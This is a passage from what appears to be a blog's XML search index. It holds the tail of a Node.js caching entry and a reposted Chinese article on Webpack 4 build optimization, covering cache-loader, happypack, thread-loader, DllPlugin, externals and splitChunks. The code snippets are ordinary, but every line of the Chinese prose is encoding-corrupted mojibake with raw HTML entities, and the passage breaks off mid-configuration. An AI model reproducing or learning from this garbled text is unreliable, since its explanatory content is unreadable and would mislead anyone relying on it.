this.ctx.service.cache.get(&apos;index_topNav&apos;);if (!topNav) &#123; topNav = await this.ctx.model.Nav.find(&#123; &quot;position&quot;: 1 &#125;); await this.ctx.service.cache.set(&apos;index_topNav&apos;, topNav, 60 * 60);&#125;]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¸¦ä½ æ·±åº¦è§£é”Webpackç³»åˆ—(ä¼˜åŒ–ç¯‡)]]></title>
    <url>%2F2020%2F03%2F16%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%BA%A6%E8%A7%A3%E9%94%81Webpack%E7%B3%BB%E5%88%97(%E4%BC%98%E5%8C%96%E7%AF%87)%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e6cfdc85188254913107c1f?utm_source=gold_browser_extension å‰ä¸¤ç¯‡æ–‡ç« ä¸­ï¼Œä¸»è¦æ˜¯è®²è§£äº† Webpack çš„é…ç½®ï¼Œä½†æ˜¯éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤§ï¼Œæ„å»ºé€Ÿåº¦å¯èƒ½ä¼šè¶Šæ¥è¶Šæ…¢ï¼Œæ„å»ºå‡ºæ¥çš„jsçš„ä½“ç§¯ä¹Ÿè¶Šæ¥è¶Šå¤§ï¼Œæ­¤æ—¶å°±éœ€è¦å¯¹ Webpack çš„é…ç½®è¿›è¡Œä¼˜åŒ–ã€‚ æœ¬æ–‡ç½—åˆ—å‡ºäº†åå¤šç§ä¼˜åŒ–æ–¹å¼ï¼Œå¤§å®¶å¯ä»¥ç»“åˆè‡ªå·±çš„é¡¹ç›®ï¼Œé€‰æ‹©é€‚å½“çš„æ–¹å¼è¿›è¡Œä¼˜åŒ–ã€‚è¿™äº› Webpack æ’ä»¶çš„æºç æˆ‘å¤§å¤šä¹Ÿæ²¡æœ‰çœ‹è¿‡ï¼Œä¸»è¦æ˜¯ç»“åˆ Webpack å®˜æ–¹æ–‡æ¡£ä»¥åŠé¡¹ç›®å®è·µï¼Œå¹¶ä¸”èŠ±äº†å¤§é‡çš„æ—¶é—´éªŒè¯åè¾“å‡ºäº†æœ¬æ–‡ï¼Œå¦‚æœæ–‡ä¸­æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºæŒ‡æ­£ã€‚ é‰´äºå‰ç«¯æŠ€æœ¯å˜æ›´è¿…é€Ÿï¼Œç¥­å‡ºæœ¬ç¯‡æ–‡ç« åŸºäº Webpack çš„ç‰ˆæœ¬å·: 12â”œâ”€â”€ webpack@4.41.5 â””â”€â”€ webpack-cli@3.3.10 æœ¬æ–‡å¯¹åº”çš„é¡¹ç›®åœ°å€(ç¼–å†™æœ¬æ–‡æ—¶ä½¿ç”¨)ä¾›å‚è€ƒï¼šgithub.com/YvetteLau/wâ€¦ é‡åŒ–æœ‰æ—¶ï¼Œæˆ‘ä»¬ä»¥ä¸ºçš„ä¼˜åŒ–æ˜¯è´Ÿä¼˜åŒ–ï¼Œè¿™æ—¶ï¼Œå¦‚æœæœ‰ä¸€ä¸ªé‡åŒ–çš„æŒ‡æ ‡å¯ä»¥çœ‹å‡ºå‰åå¯¹æ¯”ï¼Œé‚£å°†ä¼šæ˜¯å†å¥½ä¸è¿‡çš„ä¸€ä»¶äº‹ã€‚ speed-measure-webpack-plugin æ’ä»¶å¯ä»¥æµ‹é‡å„ä¸ªæ’ä»¶å’Œloaderæ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œä½¿ç”¨ä¹‹åï¼Œæ„å»ºæ—¶ï¼Œä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„ä¿¡æ¯ï¼š ![smp.jpeg](data:image/svg+xml;utf8,) å¯¹æ¯”å‰åçš„ä¿¡æ¯ï¼Œæ¥ç¡®å®šä¼˜åŒ–çš„æ•ˆæœã€‚ speed-measure-webpack-plugin çš„ä½¿ç”¨å¾ˆç®€å•ï¼Œå¯ä»¥ç›´æ¥ç”¨å…¶æ¥åŒ…è£¹ Webpack çš„é…ç½®: 12345678910//webpack.config.jsconst SpeedMeasurePlugin = require(&quot;speed-measure-webpack-plugin&quot;);const smp = new SpeedMeasurePlugin();const config = &#123; //...webpacké…ç½®&#125;module.exports = smp.wrap(config);å¤åˆ¶ä»£ç  1.exclude/includeæˆ‘ä»¬å¯ä»¥é€šè¿‡ excludeã€include é…ç½®æ¥ç¡®ä¿è½¬è¯‘å°½å¯èƒ½å°‘çš„æ–‡ä»¶ã€‚é¡¾åæ€ä¹‰ï¼Œexclude æŒ‡å®šè¦æ’é™¤çš„æ–‡ä»¶ï¼Œinclude æŒ‡å®šè¦åŒ…å«çš„æ–‡ä»¶ã€‚ exclude çš„ä¼˜å…ˆçº§é«˜äº includeï¼Œåœ¨ include å’Œ exclude ä¸­ä½¿ç”¨ç»å¯¹è·¯å¾„æ•°ç»„ï¼Œå°½é‡é¿å… excludeï¼Œæ›´å€¾å‘äºä½¿ç”¨ includeã€‚ 1234567891011121314//webpack.config.jsconst path = require(&apos;path&apos;);module.exports = &#123; //... module: &#123; rules: [ &#123; test: /\.js[x]?$/, use: [&apos;babel-loader&apos;], include: [path.resolve(__dirname, &apos;src&apos;)] &#125; ] &#125;,&#125; ä¸‹å›¾æ˜¯æˆ‘æœªé…ç½® include å’Œé…ç½®äº† include çš„æ„å»ºç»“æœå¯¹æ¯”ï¼š ![include:exclude.jpeg](data:image/svg+xml;utf8,) 2. cache-loaderåœ¨ä¸€äº›æ€§èƒ½å¼€é”€è¾ƒå¤§çš„ loader ä¹‹å‰æ·»åŠ  cache-loaderï¼Œå°†ç»“æœç¼“å­˜ä¸­ç£ç›˜ä¸­ã€‚é»˜è®¤ä¿å­˜åœ¨ node_modueles/.cache/cache-loader ç›®å½•ä¸‹ã€‚ é¦–å…ˆå®‰è£…ä¾èµ–ï¼š 1npm install cache-loader -D cache-loader çš„é…ç½®å¾ˆç®€å•ï¼Œæ”¾åœ¨å…¶ä»– loader ä¹‹å‰å³å¯ã€‚ä¿®æ”¹Webpack çš„é…ç½®å¦‚ä¸‹: 12345678910111213module.exports = &#123; //... module: &#123; //æˆ‘çš„é¡¹ç›®ä¸­,babel-loaderè€—æ—¶æ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥æˆ‘ç»™å®ƒé…ç½®äº†`cache-loader` rules: [ &#123; test: /\.jsx?$/, use: [&apos;cache-loader&apos;,&apos;babel-loader&apos;] &#125; ] &#125;&#125; å¦‚æœä½ è·Ÿæˆ‘ä¸€æ ·ï¼Œåªæ‰“ç®—ç»™ babel-loader é…ç½® cache çš„è¯ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ cache-loaderï¼Œç»™ babel-loader å¢åŠ é€‰é¡¹ cacheDirectoryã€‚ ![cache-loader.jpeg](data:image/svg+xml;utf8,) cacheDirectoryï¼šé»˜è®¤å€¼ä¸º falseã€‚å½“æœ‰è®¾ç½®æ—¶ï¼ŒæŒ‡å®šçš„ç›®å½•å°†ç”¨æ¥ç¼“å­˜ loader çš„æ‰§è¡Œç»“æœã€‚ä¹‹åçš„ Webpack æ„å»ºï¼Œå°†ä¼šå°è¯•è¯»å–ç¼“å­˜ï¼Œæ¥é¿å…åœ¨æ¯æ¬¡æ‰§è¡Œæ—¶ï¼Œå¯èƒ½äº§ç”Ÿçš„ã€é«˜æ€§èƒ½æ¶ˆè€—çš„ Babel é‡æ–°ç¼–è¯‘è¿‡ç¨‹ã€‚è®¾ç½®ç©ºå€¼æˆ–è€… true çš„è¯ï¼Œä½¿ç”¨é»˜è®¤ç¼“å­˜ç›®å½•ï¼šnode_modules/.cache/babel-loaderã€‚å¼€å¯ babel-loaderçš„ç¼“å­˜å’Œé…ç½® cache-loaderï¼Œæˆ‘æ¯”å¯¹äº†ä¸‹ï¼Œæ„å»ºæ—¶é—´å¾ˆæ¥è¿‘ã€‚ 3.happypackç”±äºæœ‰å¤§é‡æ–‡ä»¶éœ€è¦è§£æå’Œå¤„ç†ï¼Œæ„å»ºæ˜¯æ–‡ä»¶è¯»å†™å’Œè®¡ç®—å¯†é›†å‹çš„æ“ä½œï¼Œç‰¹åˆ«æ˜¯å½“æ–‡ä»¶æ•°é‡å˜å¤šåï¼ŒWebpack æ„å»ºæ…¢çš„é—®é¢˜ä¼šæ˜¾å¾—ä¸¥é‡ã€‚æ–‡ä»¶è¯»å†™å’Œè®¡ç®—æ“ä½œæ˜¯æ— æ³•é¿å…çš„ï¼Œé‚£èƒ½ä¸èƒ½è®© Webpack åŒä¸€æ—¶åˆ»å¤„ç†å¤šä¸ªä»»åŠ¡ï¼Œå‘æŒ¥å¤šæ ¸ CPU ç”µè„‘çš„å¨åŠ›ï¼Œä»¥æå‡æ„å»ºé€Ÿåº¦å‘¢ï¼Ÿ HappyPack å°±èƒ½è®© Webpack åšåˆ°è¿™ç‚¹ï¼Œå®ƒæŠŠä»»åŠ¡åˆ†è§£ç»™å¤šä¸ªå­è¿›ç¨‹å»å¹¶å‘çš„æ‰§è¡Œï¼Œå­è¿›ç¨‹å¤„ç†å®Œåå†æŠŠç»“æœå‘é€ç»™ä¸»è¿›ç¨‹ã€‚ é¦–å…ˆéœ€è¦å®‰è£… happypack: 12npm install happypack -Då¤åˆ¶ä»£ç  ä¿®æ”¹é…ç½®æ–‡ä»¶: 1234567891011121314151617181920212223242526272829303132const Happypack = require(&apos;happypack&apos;);module.exports = &#123; //... module: &#123; rules: [ &#123; test: /\.js[x]?$/, use: &apos;Happypack/loader?id=js&apos;, include: [path.resolve(__dirname, &apos;src&apos;)] &#125;, &#123; test: /\.css$/, use: &apos;Happypack/loader?id=css&apos;, include: [ path.resolve(__dirname, &apos;src&apos;), path.resolve(__dirname, &apos;node_modules&apos;, &apos;bootstrap&apos;, &apos;dist&apos;) ] &#125; ] &#125;, plugins: [ new Happypack(&#123; id: &apos;js&apos;, //å’Œruleä¸­çš„id=jså¯¹åº” //å°†ä¹‹å‰ rule ä¸­çš„ loader åœ¨æ­¤é…ç½® use: [&apos;babel-loader&apos;] //å¿…é¡»æ˜¯æ•°ç»„ &#125;), new Happypack(&#123; id: &apos;css&apos;,//å’Œruleä¸­çš„id=csså¯¹åº” use: [&apos;style-loader&apos;, &apos;css-loader&apos;,&apos;postcss-loader&apos;], &#125;) ]&#125; happypack é»˜è®¤å¼€å¯ CPUæ ¸æ•° - 1 ä¸ªè¿›ç¨‹ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¼ é€’ threads ç»™ Happypackã€‚ è¯´æ˜ï¼šå½“ postcss-loader é…ç½®åœ¨ Happypack ä¸­ï¼Œå¿…é¡»è¦åœ¨é¡¹ç›®ä¸­åˆ›å»º postcss.config.jsã€‚ 123456//postcss.config.jsmodule.exports = &#123; plugins: [ require(&apos;autoprefixer&apos;)() ]&#125; å¦åˆ™ï¼Œä¼šæŠ›å‡ºé”™è¯¯: Error: No PostCSS Config found å¦å¤–ï¼Œå½“ä½ çš„é¡¹ç›®ä¸æ˜¯å¾ˆå¤æ‚æ—¶ï¼Œä¸éœ€è¦é…ç½® happypackï¼Œå› ä¸ºè¿›ç¨‹çš„åˆ†é…å’Œç®¡ç†ä¹Ÿéœ€è¦æ—¶é—´ï¼Œå¹¶ä¸èƒ½æœ‰æ•ˆæå‡æ„å»ºé€Ÿåº¦ï¼Œç”šè‡³ä¼šå˜æ…¢ã€‚ 4.thread-loaderé™¤äº†ä½¿ç”¨ Happypack å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ thread-loader ï¼ŒæŠŠ thread-loader æ”¾ç½®åœ¨å…¶å®ƒ loader ä¹‹å‰ï¼Œé‚£ä¹ˆæ”¾ç½®åœ¨è¿™ä¸ª loader ä¹‹åçš„ loader å°±ä¼šåœ¨ä¸€ä¸ªå•ç‹¬çš„ worker æ± ä¸­è¿è¡Œã€‚ åœ¨ worker æ± (worker pool)ä¸­è¿è¡Œçš„ loader æ˜¯å—åˆ°é™åˆ¶çš„ã€‚ä¾‹å¦‚ï¼š è¿™äº› loader ä¸èƒ½äº§ç”Ÿæ–°çš„æ–‡ä»¶ã€‚ è¿™äº› loader ä¸èƒ½ä½¿ç”¨å®šåˆ¶çš„ loader APIï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡æ’ä»¶ï¼‰ã€‚ è¿™äº› loader æ— æ³•è·å– webpack çš„é€‰é¡¹è®¾ç½®ã€‚ é¦–å…ˆå®‰è£…ä¾èµ–ï¼š 1npm install thread-loader -D ä¿®æ”¹é…ç½®: 1234567891011module.exports = &#123; module: &#123; //æˆ‘çš„é¡¹ç›®ä¸­,babel-loaderè€—æ—¶æ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥æˆ‘ç»™å®ƒé…ç½® thread-loader rules: [ &#123; test: /\.jsx?$/, use: [&apos;thread-loader&apos;, &apos;cache-loader&apos;, &apos;babel-loader&apos;] &#125; ] &#125;&#125; thread-loader å’Œ Happypack æˆ‘å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œæ„å»ºæ—¶é—´åŸºæœ¬æ²¡ä»€ä¹ˆå·®åˆ«ã€‚ä¸è¿‡ thread-loader é…ç½®èµ·æ¥ä¸ºç®€å•ã€‚ 5.å¼€å¯ JS å¤šè¿›ç¨‹å‹ç¼©è™½ç„¶å¾ˆå¤š webpack ä¼˜åŒ–çš„æ–‡ç« ä¸Šä¼šæåŠå¤šè¿›ç¨‹å‹ç¼©çš„ä¼˜åŒ–ï¼Œä¸ç®¡æ˜¯ webpack-parallel-uglify-plugin æˆ–è€…æ˜¯ uglifyjs-webpack-plugin é…ç½® parallelã€‚ä¸è¿‡è¿™é‡Œæˆ‘è¦è¯´ä¸€å¥ï¼Œæ²¡å¿…è¦å•ç‹¬å®‰è£…è¿™äº›æ’ä»¶ï¼Œå®ƒä»¬å¹¶ä¸ä¼šè®©ä½ çš„ Webpack æ„å»ºé€Ÿåº¦æå‡ã€‚ å½“å‰ Webpack é»˜è®¤ä½¿ç”¨çš„æ˜¯ TerserWebpackPluginï¼Œé»˜è®¤å°±å¼€å¯äº†å¤šè¿›ç¨‹å’Œç¼“å­˜ï¼Œæ„å»ºæ—¶ï¼Œä½ çš„é¡¹ç›®ä¸­å¯ä»¥çœ‹åˆ° terser çš„ç¼“å­˜æ–‡ä»¶ node_modules/.cache/terser-webpack-pluginã€‚ 6.HardSourceWebpackPluginHardSourceWebpackPlugin ä¸ºæ¨¡å—æä¾›ä¸­é—´ç¼“å­˜ï¼Œç¼“å­˜é»˜è®¤çš„å­˜æ”¾è·¯å¾„æ˜¯: node_modules/.cache/hard-sourceã€‚ é…ç½® hard-source-webpack-pluginï¼Œé¦–æ¬¡æ„å»ºæ—¶é—´æ²¡æœ‰å¤ªå¤§å˜åŒ–ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡å¼€å§‹ï¼Œæ„å»ºæ—¶é—´å¤§çº¦å¯ä»¥èŠ‚çº¦ 80%ã€‚ é¦–å…ˆå®‰è£…ä¾èµ–: 1npm install hard-source-webpack-plugin -D ä¿®æ”¹ webpack çš„é…ç½®ï¼š 12345678//webpack.config.jsvar HardSourceWebpackPlugin = require(&apos;hard-source-webpack-plugin&apos;);module.exports = &#123; //... plugins: [ new HardSourceWebpackPlugin() ]&#125; ç”¨å¦å¤–ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é¡¹ç›®æµ‹è¯•äº†ä¸‹ï¼Œé…ç½®äº† HardSourceWebpackPluginï¼Œæ„å»ºæ—¶é—´ä» 8S å·¦å³é™åˆ°äº† 2S å·¦å³ã€‚ HardSourceWebpackPluginæ–‡æ¡£ä¸­ åˆ—å‡ºäº†ä¸€äº›ä½ å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ä»¥åŠå¦‚ä½•è§£å†³ï¼Œä¾‹å¦‚çƒ­æ›´æ–°å¤±æ•ˆï¼Œæˆ–è€…æŸäº›é…ç½®ä¸ç”Ÿæ•ˆç­‰ã€‚ 7.noParseå¦‚æœä¸€äº›ç¬¬ä¸‰æ–¹æ¨¡å—æ²¡æœ‰AMD/CommonJSè§„èŒƒç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ noParse æ¥æ ‡è¯†è¿™ä¸ªæ¨¡å—ï¼Œè¿™æ · Webpack ä¼šå¼•å…¥è¿™äº›æ¨¡å—ï¼Œä½†æ˜¯ä¸è¿›è¡Œè½¬åŒ–å’Œè§£æï¼Œä»è€Œæå‡ Webpack çš„æ„å»ºæ€§èƒ½ ï¼Œä¾‹å¦‚ï¼šjquery ã€lodashã€‚ noParse å±æ€§çš„å€¼æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æˆ–è€…æ˜¯ä¸€ä¸ª functionã€‚ 1234567//webpack.config.jsmodule.exports = &#123; //... module: &#123; noParse: /jquery|lodash/ &#125;&#125; æˆ‘å½“å‰çš„ webpack-optimize é¡¹ç›®ä¸­ï¼Œæ²¡æœ‰ä½¿ç”¨ jquery æˆ–è€…æ˜¯ lodashã€‚ å› æ­¤æ–°å»ºä¸€ä¸ªé¡¹ç›®æµ‹è¯•ï¼Œåªå¼•å…¥ jquery å’Œ loadshï¼Œç„¶åé…ç½® noParse å’Œä¸é…ç½® noParseï¼Œåˆ†åˆ«æ„å»ºæ¯”å¯¹æ—¶é—´ã€‚ é…ç½®noParse å‰ï¼Œæ„å»ºéœ€è¦ 2392msã€‚é…ç½®äº† noParse ä¹‹åï¼Œæ„å»ºéœ€è¦ 1613msã€‚ å¦‚æœä½ ä½¿ç”¨åˆ°äº†ä¸éœ€è¦è§£æçš„ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œé‚£ä¹ˆé…ç½® noParse å¾ˆæ˜¾ç„¶æ˜¯ä¸€å®šä¼šèµ·åˆ°ä¼˜åŒ–ä½œç”¨çš„ã€‚ 8.resolveresolve é…ç½® webpack å¦‚ä½•å¯»æ‰¾æ¨¡å—æ‰€å¯¹åº”çš„æ–‡ä»¶ã€‚å‡è®¾æˆ‘ä»¬ç¡®å®šæ¨¡å—éƒ½ä»æ ¹ç›®å½•ä¸‹çš„ node_modules ä¸­æŸ¥æ‰¾ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®: 12345678//webpack.config.jsconst path = require(&apos;path&apos;);module.exports = &#123; //... resolve: &#123; modules: [path.resolve(__dirname, &apos;node_modules&apos;)], &#125;&#125; éœ€è¦è®°ä½çš„æ˜¯ï¼Œå¦‚æœä½ é…ç½®äº†ä¸Šè¿°çš„ resolve.moudles ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œä¾‹å¦‚ï¼Œä½ çš„ä¾èµ–ä¸­è¿˜å­˜åœ¨ node_modules ç›®å½•ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜æ˜åœ¨ï¼Œä½†æ˜¯å´æç¤ºæ‰¾ä¸åˆ°ã€‚å› æ­¤å‘¢ï¼Œä¸ªäººä¸æ¨èé…ç½®è¿™ä¸ªã€‚å¦‚æœå…¶ä»–åŒäº‹ä¸ç†Ÿæ‚‰è¿™ä¸ªé…ç½®ï¼Œé‡åˆ°è¿™ä¸ªé—®é¢˜æ—¶ï¼Œä¼šæ‘¸ä¸ç€å¤´è„‘ã€‚ å¦å¤–ï¼Œresolve çš„ extensions é…ç½®ï¼Œé»˜è®¤æ˜¯ [&#39;.js&#39;, &#39;.json&#39;]ï¼Œå¦‚æœä½ è¦å¯¹å®ƒè¿›è¡Œé…ç½®ï¼Œè®°ä½å°†é¢‘ç‡æœ€é«˜çš„åç¼€æ”¾åœ¨ç¬¬ä¸€ä½ï¼Œå¹¶ä¸”æ§åˆ¶åˆ—è¡¨çš„é•¿åº¦ï¼Œä»¥å‡å°‘å°è¯•æ¬¡æ•°ã€‚ æœ¬é¡¹ç›®è¾ƒå°ï¼Œå› æ­¤æµ‹è¯•æ—¶ï¼Œæ­¤å¤„ä¼˜åŒ–æ•ˆæœä¸æ˜æ˜¾ã€‚ 9.IgnorePluginwebpack çš„å†…ç½®æ’ä»¶ï¼Œä½œç”¨æ˜¯å¿½ç•¥ç¬¬ä¸‰æ–¹åŒ…æŒ‡å®šç›®å½•ã€‚ ä¾‹å¦‚: moment (2.24.0ç‰ˆæœ¬) ä¼šå°†æ‰€æœ‰æœ¬åœ°åŒ–å†…å®¹å’Œæ ¸å¿ƒåŠŸèƒ½ä¸€èµ·æ‰“åŒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ IgnorePlugin åœ¨æ‰“åŒ…æ—¶å¿½ç•¥æœ¬åœ°åŒ–å†…å®¹ã€‚ 12345678//webpack.config.jsmodule.exports = &#123; //... plugins: [ //å¿½ç•¥ moment ä¸‹çš„ ./locale ç›®å½• new webpack.IgnorePlugin(/^\.\/locale$/, /moment$/) ]&#125; åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦æŒ‡å®šè¯­è¨€ï¼Œé‚£ä¹ˆéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨çš„å»å¼•å…¥è¯­è¨€åŒ…ï¼Œä¾‹å¦‚ï¼Œå¼•å…¥ä¸­æ–‡è¯­è¨€åŒ…: 12import moment from &apos;moment&apos;;import &apos;moment/locale/zh-cn&apos;;// æ‰‹åŠ¨å¼•å…¥ index.js ä¸­åªå¼•å…¥ momentï¼Œæ‰“åŒ…å‡ºæ¥çš„ bundle.js å¤§å°ä¸º 263KBï¼Œå¦‚æœé…ç½®äº† IgnorePluginï¼Œå•ç‹¬å¼•å…¥ moment/locale/zh-cnï¼Œæ„å»ºå‡ºæ¥çš„åŒ…å¤§å°ä¸º 55KBã€‚ 10.externalsæˆ‘ä»¬å¯ä»¥å°†ä¸€äº›JSæ–‡ä»¶å­˜å‚¨åœ¨ CDN ä¸Š(å‡å°‘ Webpackæ‰“åŒ…å‡ºæ¥çš„ js ä½“ç§¯)ï¼Œåœ¨ index.html ä¸­é€šè¿‡ `` æ ‡ç­¾å¼•å…¥ï¼Œå¦‚: 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;root&quot;&gt;root&lt;/div&gt; &lt;script src=&quot;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; æˆ‘ä»¬å¸Œæœ›åœ¨ä½¿ç”¨æ—¶ï¼Œä»ç„¶å¯ä»¥é€šè¿‡ import çš„æ–¹å¼å»å¼•ç”¨(å¦‚ import $ from &#39;jquery&#39;)ï¼Œå¹¶ä¸”å¸Œæœ› webpack ä¸ä¼šå¯¹å…¶è¿›è¡Œæ‰“åŒ…ï¼Œæ­¤æ—¶å°±å¯ä»¥é…ç½® externalsã€‚ 12345678//webpack.config.jsmodule.exports = &#123; //... externals: &#123; //jqueryé€šè¿‡scriptå¼•å…¥ä¹‹åï¼Œå…¨å±€ä¸­å³æœ‰äº† jQuery å˜é‡ &apos;jquery&apos;: &apos;jQuery&apos; &#125;&#125; 11.DllPluginæœ‰äº›æ—¶å€™ï¼Œå¦‚æœæ‰€æœ‰çš„JSæ–‡ä»¶éƒ½æ‰“æˆä¸€ä¸ªJSæ–‡ä»¶ï¼Œä¼šå¯¼è‡´æœ€ç»ˆç”Ÿæˆçš„JSæ–‡ä»¶å¾ˆå¤§ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±è¦è€ƒè™‘æ‹†åˆ† bundlesã€‚ DllPlugin å’Œ DLLReferencePlugin å¯ä»¥å®ç°æ‹†åˆ† bundlesï¼Œå¹¶ä¸”å¯ä»¥å¤§å¤§æå‡æ„å»ºé€Ÿåº¦ï¼ŒDllPlugin å’Œ DLLReferencePlugin éƒ½æ˜¯ webpack çš„å†…ç½®æ¨¡å—ã€‚ æˆ‘ä»¬ä½¿ç”¨ DllPlugin å°†ä¸ä¼šé¢‘ç¹æ›´æ–°çš„åº“è¿›è¡Œç¼–è¯‘ï¼Œå½“è¿™äº›ä¾èµ–çš„ç‰ˆæœ¬æ²¡æœ‰å˜åŒ–æ—¶ï¼Œå°±ä¸éœ€è¦é‡æ–°ç¼–è¯‘ã€‚æˆ‘ä»¬æ–°å»ºä¸€ä¸ª webpack çš„é…ç½®æ–‡ä»¶ï¼Œæ¥ä¸“é—¨ç”¨äºç¼–è¯‘åŠ¨æ€é“¾æ¥åº“ï¼Œä¾‹å¦‚åä¸º: webpack.config.dll.jsï¼Œè¿™é‡Œæˆ‘ä»¬å°† react å’Œ react-dom å•ç‹¬æ‰“åŒ…æˆä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚ 1234567891011121314151617181920212223//webpack.config.dll.jsconst webpack = require(&apos;webpack&apos;);const path = require(&apos;path&apos;);module.exports = &#123; entry: &#123; react: [&apos;react&apos;, &apos;react-dom&apos;] &#125;, mode: &apos;production&apos;, output: &#123; filename: &apos;[name].dll.[hash:6].js&apos;, path: path.resolve(__dirname, &apos;dist&apos;, &apos;dll&apos;), library: &apos;[name]_dll&apos; //æš´éœ²ç»™å¤–éƒ¨ä½¿ç”¨ //libraryTarget æŒ‡å®šå¦‚ä½•æš´éœ²å†…å®¹ï¼Œç¼ºçœæ—¶å°±æ˜¯ var &#125;, plugins: [ new webpack.DllPlugin(&#123; //nameå’Œlibraryä¸€è‡´ name: &apos;[name]_dll&apos;, path: path.resolve(__dirname, &apos;dist&apos;, &apos;dll&apos;, &apos;manifest.json&apos;) //manifest.jsonçš„ç”Ÿæˆè·¯å¾„ &#125;) ]&#125; åœ¨ package.json çš„ scripts ä¸­å¢åŠ : 1234567&#123; &quot;scripts&quot;: &#123; &quot;dev&quot;: &quot;NODE_ENV=development webpack-dev-server&quot;, &quot;build&quot;: &quot;NODE_ENV=production webpack&quot;, &quot;build:dll&quot;: &quot;webpack --config webpack.config.dll.js&quot; &#125;,&#125; æ‰§è¡Œ npm run build:allï¼Œå¯ä»¥çœ‹åˆ° dist ç›®å½•å¦‚ä¸‹ï¼Œä¹‹æ‰€ä»¥å°†åŠ¨æ€é“¾æ¥åº“å•ç‹¬æ”¾åœ¨ dll ç›®å½•ä¸‹ï¼Œä¸»è¦æ˜¯ä¸ºäº†ä½¿ç”¨ CleanWebpackPlugin æ›´ä¸ºæ–¹ä¾¿çš„è¿‡æ»¤æ‰åŠ¨æ€é“¾æ¥åº“ã€‚ 1234distâ””â”€â”€ dll â”œâ”€â”€ manifest.json â””â”€â”€ react.dll.9dcd9d.js manifest.json ç”¨äºè®© DLLReferencePlugin æ˜ å°„åˆ°ç›¸å…³ä¾èµ–ä¸Šã€‚ ä¿®æ”¹ webpack çš„ä¸»é…ç½®æ–‡ä»¶: webpack.config.js çš„é…ç½®ï¼š 123456789101112131415161718//webpack.config.jsconst webpack = require(&apos;webpack&apos;);const path = require(&apos;path&apos;);module.exports = &#123; //... devServer: &#123; contentBase: path.resolve(__dirname, &apos;dist&apos;) &#125;, plugins: [ new webpack.DllReferencePlugin(&#123; manifest: path.resolve(__dirname, &apos;dist&apos;, &apos;dll&apos;, &apos;manifest.json&apos;) &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns: [&apos;**/*&apos;, &apos;!dll&apos;, &apos;!dll/**&apos;] //ä¸åˆ é™¤dllç›®å½• &#125;), //... ]&#125; ä½¿ç”¨ npm run build æ„å»ºï¼Œå¯ä»¥çœ‹åˆ° bundle.js çš„ä½“ç§¯å¤§å¤§å‡å°‘ã€‚ ä¿®æ”¹ public/index.html æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­å¼•å…¥ react.dll.js 1&lt;script src=&quot;/dll/react.dll.9dcd9d.js&quot;&gt;&lt;/script&gt; æ„å»ºé€Ÿåº¦ åŒ…ä½“ç§¯ 12.æŠ½ç¦»å…¬å…±ä»£ç æŠ½ç¦»å…¬å…±ä»£ç æ˜¯å¯¹äºå¤šé¡µåº”ç”¨æ¥è¯´çš„ï¼Œå¦‚æœå¤šä¸ªé¡µé¢å¼•å…¥äº†ä¸€äº›å…¬å…±æ¨¡å—ï¼Œé‚£ä¹ˆå¯ä»¥æŠŠè¿™äº›å…¬å…±çš„æ¨¡å—æŠ½ç¦»å‡ºæ¥ï¼Œå•ç‹¬æ‰“åŒ…ã€‚å…¬å…±ä»£ç åªéœ€è¦ä¸‹è½½ä¸€æ¬¡å°±ç¼“å­˜èµ·æ¥äº†ï¼Œé¿å…äº†é‡å¤ä¸‹è½½ã€‚ æŠ½ç¦»å…¬å…±ä»£ç å¯¹äºå•é¡µåº”ç”¨å’Œå¤šé¡µåº”è¯¥åœ¨é…ç½®ä¸Šæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œéƒ½æ˜¯é…ç½®åœ¨ optimization.splitChunks ä¸­ã€‚ 1234567891011121314151617181920212223242526//webpack.config.jsmodule.exports = &#123; optimization: &#123; splitChunks: &#123;//åˆ†å‰²ä»£ç å— cacheGroups: 